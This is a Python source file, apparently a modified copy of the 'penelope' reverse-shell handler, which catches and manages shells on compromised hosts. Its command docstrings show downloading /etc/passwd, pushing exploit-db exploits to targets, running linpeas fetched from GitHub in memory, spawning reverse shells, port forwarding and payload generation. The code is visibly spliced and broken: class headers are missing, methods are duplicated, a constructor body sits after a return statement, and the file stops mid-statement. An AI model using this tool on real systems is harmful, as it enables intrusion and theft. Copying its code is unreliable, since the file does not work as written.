#!/usr/bin/env python3

# Copyright © 2021 - 2025 @brightio <brightiocode@gmail.com>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

__program__= "penelope"
__version__ = "0.14.8"

import os
import io
import re
import sys
import tty
import ssl
import time
import shlex
import queue
import struct
import shutil
import socket
import signal
import base64
import termios
import tarfile
import logging
import zipfile
import inspect
import warnings
import platform
import threading
import subprocess
import socketserver

from math import ceil
from glob import glob
from json import dumps
from code import interact
from zlib import compress
from errno import EADDRINUSE, EADDRNOTAVAIL
from select import select
from pathlib import Path, PureWindowsPath
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
from datetime import datetime
from textwrap import indent, dedent
from binascii import Error as binascii_error
from functools import wraps
from collections import deque, defaultdict
from http.server import SimpleHTTPRequestHandler
from urllib.parse import unquote
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

# Modularized components
from penelope_mod.ui import paint, Table, Size, PBar
from penelope_mod.network import Interfaces
from penelope_mod.buffer import LineBuffer
from penelope_mod.messaging import Messenger, Stream
from penelope_mod.io import stdout, ask, my_input
from penelope_mod.context import ctx, set_context
from penelope_mod.menu import BetterCMD, MainMenu
from penelope_mod.exceptions import custom_excepthook
from penelope_mod.core import TCPListener as _TCPListener, Connect as _Connect
from penelope_mod.fileserver import FileServer as _FileServer
from penelope_mod.plugins import discover
from penelope_mod.system import fonts_installed, Open
from penelope_mod.constants import URLS as URLS_CONST

################################## PYTHON MISSING BATTERIES ####################################
from string import ascii_letters
from random import choice, randint
rand = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
caller = lambda: inspect.stack()[2].function
bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))

def Open(item, terminal=False):
    if myOS != 'Darwin' and not DISPLAY:
        logger.error("No available $DISPLAY")
        return False

    if not terminal:
        program = 'xdg-open' if myOS != 'Darwin' else 'open'
        args = [item]
    else:
        if not TERMINAL:
            logger.error("No available terminal emulator")
            return False

        if myOS != 'Darwin':
            program = TERMINAL
            _switch = '-e'
            if program in ('gnome-terminal', 'mate-terminal'):
                _switch = '--'
            elif program == 'terminator':
                _switch = '-x'
            elif program == 'xfce4-terminal':
                _switch = '--command='
            args = [_switch, *shlex.split(item)]
        else:
            program = 'osascript'
            args = ['-e', f'tell app "Terminal" to do script "{item}"']

    if not shutil.which(program):
        logger.error(f"Cannot open window: '{program}' binary does not exist")
        return False

    process = subprocess.Popen(
        (program, *args),
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE
    )
    r, _, _ = select([process.stderr], [], [], .01)
    if process.stderr in r:
        error = os.read(process.stderr.fileno(), 1024)
        if error:
            logger.error(error.decode())
            return False
    return True








from datetime import timedelta
from threading import Thread, RLock, current_thread




class CustomFormatter(logging.Formatter):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.templates = {
            logging.CRITICAL: {'color':"RED",     'prefix':"[!!!]"},
            logging.ERROR:    {'color':"red",     'prefix':"[-]"},
            logging.WARNING:  {'color':"yellow",  'prefix':"[!]"},
            logging.TRACE:    {'color':"cyan",    'prefix':"[•]"},
            logging.INFO:     {'color':"green",   'prefix':"[+]"},
            logging.DEBUG:    {'color':"magenta", 'prefix':"[DEBUG]"}
        }

    def format(self, record):
        template = self.templates[record.levelno]

        thread = ""
        if record.levelno is logging.DEBUG or options.debug:
            thread = paint(" ") + paint(threading.current_thread().name).white_CYAN

        prefix = "\x1b[2K\r"
        suffix = "\r\n"

        if core.wait_input:
            suffix += bytes(core.output_line_buffer).decode() + readline.get_line_buffer()

        elif core.attached_session:
            suffix += bytes(core.output_line_buffer).decode()

        text = f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}"
        return f"{prefix}{getattr(paint(text), template['color'])}{suffix}"




def my_input(text="", histfile=None, histlen=None, completer=lambda text, state: None, completer_delims=None):
    if threading.current_thread().name == 'MainThread':
        signal.signal(signal.SIGINT, keyboard_interrupt)

    if readline:
        readline.set_completer(completer)
        readline.set_completer_delims(completer_delims or default_readline_delims)
        readline.clear_history()
        if histfile:
            try:
                readline.read_history_file(histfile)
            except Exception as e:
                cmdlogger.debug(f"Error loading history file: {e}")
        #readline.set_auto_history(True)

    core.output_line_buffer << b"\n" + text.encode()
    core.wait_input = True

    try:
        response = original_input(text)

        if readline:
            #readline.set_completer(None)
            #readline.set_completer_delims(default_readline_delims)
            if histfile:
                try:
                    readline.set_history_length(options.histlength)
                    #readline.add_history(response)
                    readline.write_history_file(histfile)
                except Exception as e:
                    cmdlogger.debug(f"Error writing to history file: {e}")
            #readline.set_auto_history(False)
        return response
    finally:
        core.wait_input = False


    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.set_id(None)
        self.commands = {
            "Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
            "Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
            "Shell Management"  :['listeners', 'payloads', 'connect', 'Interfaces'],
            "Miscellaneous"     :['help', 'modules', 'history', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
        }

    @property
    def raw_commands(self):
        return [command.split('|')[0] for command in sum(self.commands.values(), [])]

    @property
    def active_sessions(self):
        active_sessions = len(core.sessions)
        if active_sessions:
            s = "s" if active_sessions > 1 else ""
            return paint(f" ({active_sessions} active session{s})").red + paint().yellow
        return ""

    @staticmethod
    def get_core_id_completion(text, *extra, attr='sessions'):
        options = list(map(str, getattr(core, attr)))
        options.extend(extra)
        return [option for option in options if option.startswith(text)]

    def set_id(self, ID):
        self.sid = ID
        session_part = (
                f"{paint('─(').cyan_DIM}{paint('Session').green} "
                f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
        ) if self.sid else ''
        self.prompt = (
                f"{paint(f'(').cyan_DIM}{paint('Penelope').magenta}{paint(f')').cyan_DIM}"
                f"{session_part}{paint('>').cyan_DIM} "
        )

    def session_operation(current=False, extra=[]):
        def inner(func):
            @wraps(func)
            def newfunc(self, ID):
                if current:
                    if not self.sid:
                        if core.sessions:
                            cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
                        else:
                            cmdlogger.warning("No available sessions to perform this action")
                        return False
                else:
                    if ID:
                        if ID.isnumeric() and int(ID) in core.sessions:
                            ID = int(ID)
                        elif ID not in extra:
                            cmdlogger.warning("Invalid session ID")
                            return False
                    else:
                        if self.sid:
                            ID = self.sid
                        else:
                            cmdlogger.warning("No session selected")
                            return None
                return func(self, ID)
            return newfunc
        return inner

    def interrupt(self):
        if core.attached_session and not core.attached_session.type == 'Readline':
            core.attached_session.detach()
        else:
            if menu.sid and not core.sessions[menu.sid].agent: # TEMP
                core.sessions[menu.sid].control_session.subchannel.control << 'stop'

    def show_help(self, command):
        help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
        parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
        print("\n", paint(command).green, paint(parts[1]).blue, "\n")
        modified_parts = []
        for part in parts[2:]:
            part = help_prompt.sub('', part)
            modified_parts.append(part)
        print(indent("\n".join(modified_parts), '    '))

        if command == 'run':
            self.show_modules()

    def do_help(self, command):
        """
        [command | -a]
        Show Main Menu help or help about a specific command

        Examples:

            help        Show all commands at a glance
            help interact    Show extensive information about a command
            help -a        Show extensive information for all commands
        """
        if command:
            if command == "-a":
                for section in self.commands:
                    print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
                    for command in self.commands[section]:
                        self.show_help(command)
            else:
                if command in self.raw_commands:
                    self.show_help(command)
                else:
                    cmdlogger.warning(
                        f"No such command: '{command}'. "
                        "Issue 'help' for all available commands"
                    )
        else:
            for section in self.commands:
                print(f'\n{paint(section).yellow}\n{paint("─" * len(section)).cyan}')
                table = Table(joinchar=' · ')
                for command in self.commands[section]:
                    parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
                    table += [paint(command).green, paint(parts[0]).blue, parts[1]]
                print(table)
            print()

    @session_operation(extra=['none'])
    def do_use(self, ID):
        """
        [SessionID|none]
        Select a session

        Examples:

            use 1        Select the SessionID 1
            use none    Unselect any selected session
        """
        if ID == 'none':
            self.set_id(None)
        else:
            self.set_id(ID)

    def do_sessions(self, line):
        """
        [SessionID]
        Show active sessions or interact with the SessionID

        Examples:

            sessions        Show active sessions
            sessions 1        Interact with SessionID 1
        """
        if line:
            if self.do_interact(line):
                return True
        else:
            if core.sessions:
                for host, sessions in core.hosts.items():
                    if not sessions:
                        continue
                    print('\n➤  ' + sessions[0].name_colored)
                    table = Table(joinchar=' | ')
                    table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source')]
                    for session in sessions:
                        if self.sid == session.id:
                            ID = paint('[' + str(session.id) + ']').red
                        elif session.new:
                            if session.host_needs_control_session and session.control_session is session:
                                ID = paint(' ' + str(session.id)).cyan
                            else:
                                ID = paint('<' + str(session.id) + '>').yellow_BLINK
                        else:
                            ID = paint(' ' + str(session.id)).yellow
                        source = session.listener or f'Connect({session._host}:{session.port})'
                        table += [
                            ID,
                            paint(session.type).CYAN if session.type == 'PTY' else session.type,
                            session.user or 'N/A',
                            source
                        ]
                    print("\n", indent(str(table), "    "), "\n", sep="")
            else:
                print()
                cmdlogger.warning("No sessions yet 😟")
                print()

    @session_operation()
    def do_interact(self, ID):
        """
        [SessionID]
        Interact with a session

        Examples:

            interact    Interact with current session
            interact 1    Interact with SessionID 1
        """
        return core.sessions[ID].attach()

    @session_operation(extra=['*'])
    def do_kill(self, ID):
        """
        [SessionID|*]
        Kill a session

        Examples:

            kill        Kill the current session
            kill 1        Kill SessionID 1
            kill *        Kill all sessions
        """

        if ID == '*':
            if not core.sessions:
                cmdlogger.warning("No sessions to kill")
                return False
            else:
                if ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower() == 'y':
                    if options.maintain > 1:
                        options.maintain = 1
                        self.onecmd("maintain")
                    for session in reversed(list(core.sessions.copy().values())):
                        session.kill()
        else:
            core.sessions[ID].kill()

        if options.single_session and len(core.sessions) == 1:
            core.stop()
            logger.info("Penelope exited due to Single Session mode")
            return True

    @session_operation(current=True)
    def do_portfwd(self, line):
        """
        host:port(<-|->)host:port
        Local and Remote port forwarding

        Examples:

            -> 192.168.0.1:80        Forward 127.0.0.1:80 to 192.168.0.1:80
            0.0.0.0:8080 -> 192.168.0.1:80    Forward 0.0.0.0:8080 to 192.168.0.1:80
        """
        if not line:
            cmdlogger.warning("No parameters...")
            return False

        match = re.search(r"((?:.*)?)(<-|->)((?:.*)?)", line)
        if match:
            group1 = match.group(1)
            arrow = match.group(2)
            group2 = match.group(3)
        else:
            cmdlogger.warning("Invalid syntax")
            return False

        if arrow == '->':
            _type = 'L'
            lhost = "127.0.0.1"

            if group2:
                match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group2)
                if match:
                    rhost = match.group(1)
                    rport = match.group(2)
                    lport = rport
                if not rport:
                    cmdlogger.warning("At least remote port is required")
                    return False
            else:
                cmdlogger.warning("At least remote port is required")
                return False

            if group1:
                match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group1)
                if match:
                    lhost = match.group(1)
                    lport = match.group(2)
                else:
                    cmdlogger.warning("Invalid syntax")
                    return False

        elif arrow == '<-':
            _type = 'R'

            if group2:
                rhost, rport = group2.split(':')

            if group1:
                lhost, lport = group1.split(':')
            else:
                cmdlogger.warning("At least local port is required")
                return False

        core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))

    @session_operation(current=True)
    def do_download(self, remote_items):
        """
        <glob>...
        Download files / folders from the target

        Examples:

            download /etc            Download a remote directory
            download /etc/passwd        Download a remote file
            download /etc/cron*        Download multiple remote files and directories using glob
            download /etc/issue /var/spool    Download multiple remote files and directories at once
        """
        if remote_items:
            core.sessions[self.sid].download(remote_items)
        else:
            cmdlogger.warning("No files or directories specified")

    @session_operation(current=True)
    def do_open(self, remote_items):
        """
        <glob>...
        Download files / folders from the target and open them locally

        Examples:

            open /etc            Open locally a remote directory
            open /root/secrets.ods        Open locally a remote file
            open /etc/cron*            Open locally multiple remote files and directories using glob
            open /etc/issue /var/spool    Open locally multiple remote files and directories at once
        """
        if remote_items:
            items = core.sessions[self.sid].download(remote_items)

            if len(items) > options.max_open_files:
                cmdlogger.warning(
                    f"More than {options.max_open_files} items selected"
                    " for opening. The open list is truncated to "
                    f"{options.max_open_files}."
                )
                items = items[:options.max_open_files]

            for item in items:
                Open(item)
        else:
            cmdlogger.warning("No files or directories specified")

    @session_operation(current=True)
    def do_upload(self, local_items):
        """
        <glob|URL>...
        Upload files / folders / HTTP(S)/FTP(S) URLs to the target
        HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
        when the target has no Internet access

        Examples:

            upload /tools                      Upload a directory
            upload /tools/mysuperdupertool.sh          Upload a file
            upload /tools/privesc* /tools2/*.sh          Upload multiple files and directories using glob
            upload https://github.com/x/y/z.sh          Download the file locally and then push it to the target
            upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
        """
        if local_items:
            core.sessions[self.sid].upload(local_items, randomize_fname=True)
        else:
            cmdlogger.warning("No files or directories specified")

    @session_operation(current=True)
    def do_script(self, local_item):
        """
        <local_script|URL>
        In-memory local or URL script execution & real time downloaded output

        Examples:
            script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
        """
        if local_item:
            core.sessions[self.sid].script(local_item)
        else:
            cmdlogger.warning("No script to execute")

    @staticmethod
    def show_modules():
        categories = defaultdict(list)
        for module in modules().values():
            categories[module.category].append(module)

        print()
        for category in categories:
            print("  " + str(paint(category).BLUE))
            table = Table(joinchar=' │ ')
            for module in categories[category]:
                description = module.run.__doc__ or ""
                if description:
                    description = module.run.__doc__.strip().splitlines()[0]
                table += [paint(module.__name__).red, description]
            print(indent(str(table), '  '), "\n", sep="")

    @session_operation(current=True)
    def do_run(self, line):
        """
        [module name]
        Run a module. Run 'help run' to view the available modules"""
        try:
            parts = line.split(" ", 1)
            module_name = parts[0]
        except:
            module_name = None
            print()
            cmdlogger.warning(paint("Select a module").YELLOW_white)

        if module_name:
            module = modules().get(module_name)
            if module:
                args = parts[1] if len(parts) == 2 else ''
                module.run(core.sessions[self.sid], args)
            else:
                cmdlogger.warning(f"Module '{module_name}' does not exist")
        else:
            self.show_modules()

    @session_operation(current=True)
    def do_spawn(self, line):
        """
        [Port] [Host]
        Spawn a new session.

        Examples:

            spawn            Spawn a new session. If the current is bind then in will create a
                        bind shell. If the current is reverse, it will spawn a reverse one

            spawn 5555        Spawn a reverse shell on 5555 port. This can be used to get shell
                        on another tab. On the other tab run: ./penelope.py 5555

            spawn 3333 10.10.10.10    Spawn a reverse shell on the port 3333 of the 10.10.10.10 host
        """
        host, port = None, None

        if line:
            args = line.split(" ")
            try:
                port = int(args[0])
            except ValueError:
                cmdlogger.error("Port number should be numeric")
                return False
            arg_num = len(args)
            if arg_num == 2:
                host = args[1]
            elif arg_num > 2:
                print()
                cmdlogger.error("Invalid PORT - HOST combination")
                self.onecmd("help spawn")
                return False

        core.sessions[self.sid].spawn(port, host)

    def do_maintain(self, line):
        """
        [NUM]
        Maintain NUM active shells for each target

        Examples:

            maintain 5        Maintain 5 active shells
            maintain 1        Disable maintain functionality
        """
        if line:
            if line.isnumeric():
                num = int(line)
                options.maintain = num
                refreshed = False
                for host in core.hosts.values():
                    if len(host) < num:
                        refreshed = True
                        host[0].maintain()
                if not refreshed:
                    self.onecmd("maintain")
            else:
                cmdlogger.error("Invalid number")
        else:
            status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
            cmdlogger.info(f"Maintain value set to {paint(options.maintain).yellow} {status}")

    @session_operation(current=True)
    def do_upgrade(self, ID):
        """

        Upgrade the current session's shell to PTY
        Note: By default this is automatically run on the new sessions. Disable it with -U
        """
        core.sessions[self.sid].upgrade()

    def do_dir(self, ID):
        """
        [SessionID]
        Open the session's local folder. If no session specified, open the base folder
        """
        folder = core.sessions[self.sid].directory if self.sid else options.basedir
        Open(folder)
        print(folder)

    @session_operation(current=True)
    def do_exec(self, cmdline):
        """
        <remote command>
        Execute a remote command

        Examples:
            exec cat /etc/passwd
        """
        if cmdline:
            if core.sessions[self.sid].agent:
                core.sessions[self.sid].exec(
                    cmdline,
                    timeout=None,
                    stdout_dst=sys.stdout.buffer,
                    stderr_dst=sys.stderr.buffer
                )
            else:
                output = core.sessions[self.sid].exec(
                    cmdline,
                    timeout=None,
                    value=True
                )
                print(output)
        else:
            cmdlogger.warning("No command to execute")

    '''@session_operation(current=True) # TODO
    def do_tasks(self, line):
        """

        Show assigned tasks
        """
        table = Table(joinchar=' | ')
        table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']

        for sessionid in core.sessions:
            tasks = core.sessions[sessionid].tasks
            for taskid in tasks:
                for stream in tasks[taskid]['streams'].values():
                    if stream.closed:
                        status = paint('Completed!').GREEN
                        break
                else:
                    status = paint('Active...').YELLOW

                table += [
                    paint(sessionid).red,
                    paint(taskid).cyan,
                    paint(tasks[taskid]['pid']).blue,
                    paint(tasks[taskid]['command']).yellow,
                    paint(tasks[taskid]['streams']['1'].name).green,
                    status
                ]

        if len(table) > 1:
            print(table)
        else:
            logger.warning("No assigned tasks")'''

    def do_listeners(self, line):
        """
        [<add|stop>[-i <iface>][-p <port>]]
        Add / stop / view Listeners

        Examples:

            listeners            Show active Listeners
            listeners add -i any -p 4444    Create a Listener on 0.0.0.0:4444
            listeners stop 1        Stop the Listener with ID 1
        """
        if line:
            parser = ArgumentParser(prog="listeners")
            subparsers = parser.add_subparsers(dest="command", required=True)

            parser_add = subparsers.add_parser("add", help="Add a new listener")
            parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
            parser_add.add_argument("-p", "--port", help="Port to listen on", default=options.default_listener_port)
            parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')

            parser_stop = subparsers.add_parser("stop", help="Stop a listener")
            parser_stop.add_argument("id", help="Listener ID to stop")

            try:
                args = parser.parse_args(line.split())
            except SystemExit:
                return False

            if args.command == "add":
                if args.type == 'tcp':
                    TCPListener(args.interface, args.port)

            elif args.command == "stop":
                if args.id == '*':
                    listeners = core.listeners.copy()
                    if listeners:
                        for listener in listeners.values():
                            listener.stop()
                    else:
                        cmdlogger.warning("No listeners to stop...")
                        return False
                else:
                    try:
                        core.listeners[int(args.id)].stop()
                    except (KeyError, ValueError):
                        logger.error("Invalid Listener ID")

        else:
            if core.listeners:
                table = Table(joinchar=' | ')
                table.header = [paint(header).red for header in ('ID', 'Type', 'Host', 'Port')]
                for listener in core.listeners.values():
                    table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
                print('\n', indent(str(table), '  '), '\n', sep='')
            else:
                cmdlogger.warning("No active Listeners...")

    def do_connect(self, line):
        """
        <Host> <Port>
        Connect to a bind shell

        Examples:

            connect 192.168.0.101 5555
        """
        if not line:
            cmdlogger.warning("No target specified")
            return False
        try:
            address, port = line.split(' ')

        except ValueError:
            cmdlogger.error("Invalid Host-Port combination")

        else:
            if Connect(address, port) and not options.no_attach:
                return True

    def do_payloads(self, line):
        """

        Create reverse shell payloads based on the active listeners
        """
        if core.listeners:
            print()
            for listener in core.listeners.values():
                print(listener.payloads, end='\n\n')
        else:
         cmdlogger.warning("No Listeners to show payloads")

    def do_Interfaces(self, line):
        """

        Show the local network interfaces
        """
        print(Interfaces())

    def do_exit(self, line):
        """

        Exit Penelope
        """
        if ask(f"Exit Penelope?{self.active_sessions} (y/N): ").lower() == 'y':
            super().do_exit(line)
            core.stop()
            for thread in threading.enumerate():
                if thread.name == 'Core':
                    thread.join()
            cmdlogger.info("Exited!")
            remaining_threads = [thread for thread in threading.enumerate()]
            if options.dev_mode and remaining_threads:
                cmdlogger.error(f"REMAINING THREADS: {remaining_threads}")
            return True
        return False

    def do_EOF(self, line):
        if self.sid:
            self.set_id(None)
            print()
        else:
            print("exit")
            return self.do_exit(line)

    def do_modules(self, line):
        """

        Show available modules
        """


class ControlQueue:

    def __init__(self):
        self._out, self._in = os.pipe()
        self.queue = queue.Queue() # TODO

    def fileno(self):
        return self._out

    def __lshift__(self, command):
        self.queue.put(command)
        os.write(self._in, b'\x00')

    def get(self):
        os.read(self._out, 1)
        return self.queue.get()

    def clear(self):
        amount = 0
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                amount += 1
            except queue.Empty:
                break
        os.read(self._out, amount) # maybe needs 'try' because sometimes close() precedes

    def close(self):
        os.close(self._in)
        os.close(self._out)

class Core:
    def __init__(self):
        self.running = True
        self.started = False
        self.sessions = []
        self.wait_input = False
        
        # Инициализируем атрибуты для __getattr__
        self.listenerID = 0
        self.listener_lock = threading.Lock()
        self.sessionID = 0
        self.session_lock = threading.Lock()
        self.fileserverID = 0
        self.fileserver_lock = threading.Lock()
        
        # Инициализируем остальные атрибуты
        self.control = ControlQueue()
        self.rlist = [self.control]
        self.wlist = []

        self.attached_session = None
        self.session_wait_host = None
        self.session_wait = queue.LifoQueue()

        self.lock = threading.Lock() # TO REMOVE
        self.conn_semaphore = threading.Semaphore(5)

        self.hosts = defaultdict(list)
        self.listeners = {}
        self.fileservers = {}
        self.forwardings = {}

        self.output_line_buffer = LineBuffer(1)

    def stop(self):
        self.running = False
        self.started = False
        self.session_wait = queue.LifoQueue()

        self.lock = threading.Lock() # TO REMOVE
        self.conn_semaphore = threading.Semaphore(5)

        self.listenerID = 0
        self.listener_lock = threading.Lock()
        self.sessionID = 0
        self.session_lock = threading.Lock()
        self.fileserverID = 0
        self.fileserver_lock = threading.Lock()

        self.hosts = defaultdict(list)
        self.sessions = {}
        self.listeners = {}
        self.fileservers = {}
        self.forwardings = {}

        self.output_line_buffer = LineBuffer(1)
        self.wait_input = False

    def __getattr__(self, name):

        if name == 'new_listenerID':
            with self.listener_lock:
                self.listenerID += 1
                return self.listenerID

        elif name == 'new_sessionID':
            with self.session_lock:
                self.sessionID += 1
                return self.sessionID

        elif name == 'new_fileserverID':
            with self.fileserver_lock:
                self.fileserverID += 1
                return self.fileserverID
        else:
            raise AttributeError(name)

    @property
    def threads(self):
        return [thread.name for thread in threading.enumerate()]

    def start(self):
        self.started = True
        threading.Thread(target=self.loop, name="Core").start()

    def loop(self):

        while self.started:
            readables, writables, _ = select(self.rlist, self.wlist, [])

            for readable in readables:

                # The control queue
                if readable is self.control:
                    command = self.control.get()
                    if command:
                        logger.debug(f"About to execute {command}")
                    else:
                        logger.debug("Core break")
                    try:
                        exec(command)
                    except KeyError: # TODO
                        logger.debug("The session does not exist anymore")
                    break

                # The listeners
                elif readable.__class__ is TCPListener:
                    _socket, endpoint = readable.socket.accept()
                    thread_name = f"NewCon{endpoint}"
                    logger.debug(f"New thread: {thread_name}")
                    threading.Thread(target=Session, args=(_socket, *endpoint, readable), name=thread_name).start()

                # STDIN
                elif readable is sys.stdin:
                    if self.attached_session:
                        session = self.attached_session
                        if session.type == 'Readline':
                            continue

                        data = os.read(sys.stdin.fileno(), options.network_buffer_size)

                        if session.subtype == 'cmd':
                            self._cmd = data

                        if data == options.escape['sequence']:
                            if session.alternate_buffer:
                                logger.error("(!) Exit the current alternate buffer program first")
                            else:
                                session.detach()
                        else:
                            if session.type == 'Raw':
                                session.record(data, _input=not session.interactive)

                            elif session.agent:
                                data = Messenger.message(Messenger.SHELL, data)

                            session.send(data, stdin=True)
                    else:
                        logger.error("You shouldn't see this error; Please report it")

                # The sessions
                elif readable.__class__ is Session:
                    try:
                        data = readable.socket.recv(options.network_buffer_size)
                        if not data:
                            raise OSError

                    except OSError:
                        logger.debug("Died while reading")
                        readable.kill()
                        break

                    # TODO need thread sync
                    target = readable.shell_response_buf\
                    if not readable.subchannel.active\
                    and readable.subchannel.allow_receive_shell_data\
                    else readable.subchannel

                    if readable.agent:
                        for _type, _value in readable.messenger.feed(data):
                            #print(_type, _value)
                            if _type == Messenger.SHELL:
                                if not _value: # TEMP
                                    readable.kill()
                                    break
                                target.write(_value)

                            elif _type == Messenger.STREAM:
                                stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
                                #print((repr(stream_id), repr(data)))
                                try:
                                    readable.streams[stream_id] << data
                                except (OSError, KeyError):
                                    logger.debug(f"Cannot write to stream; Stream <{stream_id}> died prematurely")
                    else:
                        target.write(data)

                    shell_output = readable.shell_response_buf.getvalue() # TODO
                    if shell_output:
                        if readable.is_attached:
                            stdout(shell_output)

                        readable.record(shell_output)

                        if b'\x1b[?1049h' in data:
                            readable.alternate_buffer = True

                        if b'\x1b[?1049l' in data:
                            readable.alternate_buffer = False
                        #if readable.subtype == 'cmd' and self._cmd == data:
                        #    data, self._cmd = b'', b'' # TODO

                        readable.shell_response_buf.seek(0)
                        readable.shell_response_buf.truncate(0)

            for writable in writables:
                with writable.wlock:
                    try:
                        sent = writable.socket.send(writable.outbuf.getvalue())
                    except OSError:
                        logger.debug("Died while writing")
                        writable.kill()
                        break

                    writable.outbuf.seek(sent)
                    remaining = writable.outbuf.read()
                    writable.outbuf.seek(0)
                    writable.outbuf.truncate()
                    writable.outbuf.write(remaining)
                    if not remaining:
                        self.wlist.remove(writable)

    def stop(self):
        options.maintain = 0

        if self.sessions:
            logger.warning("Killing sessions...")
            for session in reversed(list(self.sessions.copy().values())):
                session.kill()

        for listener in self.listeners.copy().values():
            listener.stop()

        for fileserver in self.fileservers.copy().values():
            fileserver.stop()

        self.control << 'self.started = False'

        menu.stop = True
        menu.cmdqueue.append("")
        menu.active.set()



class Channel:
    def __init__(self):
        self.active = False
        self.control = None
        self.can_use = True

    def __init__(self, raw=False, expect = []):
        self._read, self._write = os.pipe()
        self.can_use = True
        self.active = True
        self.allow_receive_shell_data = True
        self.control = ControlQueue()

    def fileno(self):
        return self._read

    def read(self):
        return os.read(self._read, options.network_buffer_size)

    def write(self, data):
        os.write(self._write, data)

    def close(self):
        os.close(self._read)
        os.close(self._write)

class Session:

    def __init__(self, _socket, target, port, listener=None):
        self._socket = _socket
        self._cwd = None
        self._bin = {}
        self.target = target
        self.port = port
        self.listener = listener
        self.OS = None
        self.type = None
        self.subtype = None
        self.interactive = False
        self.echoing = False
        self.prompt = None
        self.subchannel = Channel()
        
    @property
    def cwd(self):
        return self._cwd
        
    @cwd.setter
    def cwd(self, value):
        self._cwd = value
        
    @property
    def bin(self):
        return self._bin
        
    @bin.setter
    def bin(self, value):
        self._bin = value
        
    def __bool__(self):
        if self._socket is None:
            return False
        return self._socket.fileno() != -1
        with core.conn_semaphore:
            #print(core.threads)
            print("\a", flush=True, end='')

            self.socket = _socket
            self.target = target
            self.port = port
            self.listener = listener

            if self.socket is not None:
                self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

            self.source = 'reverse' if listener else 'bind'

            self.id = None
            self.OS = None
            self.type = 'Raw'
            self.subtype = None
            self.interactive = None
            self.echoing = None
            self.pty_ready = None

            self.win_version = None

            self.prompt = None
            self.new = True

            self.last_lines = LineBuffer(options.attach_lines)
            self.lock = threading.Lock()
            self.wlock = threading.Lock()

            self.outbuf = io.BytesIO()
            self.shell_response_buf = io.BytesIO()

            self.tasks = {"portfwd":[], "scripts":[]}
            self.subchannel = Channel()
            self.latency = None

            self.alternate_buffer = False
            self.agent = False
            self.messenger = Messenger(io.BytesIO)

            self.streamID = 0
            self.streams = dict()
            self.stream_lock = threading.Lock()
            self.stream_code = Messenger.STREAM_CODE
            self.streams_max = 2 ** (8 * Messenger.STREAM_BYTES)

            self.shell_pid = None
            self.user = None
            self.tty = None

            self._bin = defaultdict(lambda: "")
            self._tmp = None
            self._cwd = None
            self._can_deploy_agent = None

            self.upgrade_attempted = False

            core.rlist.append(self)

            if self.determine():
                logger.debug(f"OS: {self.OS}")
                logger.debug(f"Type: {self.type}")
                logger.debug(f"Subtype: {self.subtype}")
                logger.debug(f"Interactive: {self.interactive}")
                logger.debug(f"Echoing: {self.echoing}")

                self.get_system_info()

                if not self.hostname:
                    if target == self.ip:
                        try:
                            self.hostname = socket.gethostbyaddr(target)[0]

                        except socket.herror:
                            self.hostname = ''
                            logger.debug("Cannot resolve hostname")
                    else:
                        self.hostname = target

                hostname = self.hostname
                c1 = '~' if hostname else ''
                ip = self.ip
                c2 = '-'
                system = self.system
                if not system:
                    system = self.OS.upper()
                if self.arch:
                    system += '-' + self.arch

                self.name = f"{hostname}{c1}{ip}{c2}{system}"
                self.name_colored = (
                    f"{paint(hostname).white_BLUE}{paint(c1).white_DIM}"
                    f"{paint(ip).white_RED}{paint(c2).white_DIM}"
                    f"{paint(system).cyan}"
                )

                self.id = core.new_sessionID
                core.hosts[self.name].append(self)
                core.sessions[self.id] = self

                if self.name == core.session_wait_host:
                    core.session_wait.put(self.id)

                logger.info(
                    f"Got {self.source} shell from "
